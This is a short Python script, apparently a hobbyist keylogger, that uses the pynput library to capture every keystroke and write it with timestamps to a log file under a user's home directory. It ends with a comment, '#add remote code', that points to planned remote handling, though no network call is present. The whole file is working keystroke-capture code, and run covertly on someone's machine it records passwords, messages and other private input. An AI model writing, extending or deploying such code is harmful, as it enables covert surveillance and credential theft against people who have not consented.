from pynput.keyboard import Key, Listener       #pynput module to listen for keystrokes(need to install pynput module via pip)
import logging                    #logging
log_dir = r"/home/pukar/"       #log file directory (absolute path)
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')    #specify log file config
def on_press(key):
    logging.info(str(key))      #save every key on press
with Listener(on_press=on_press) as listener:
    listener.join()
#add remote code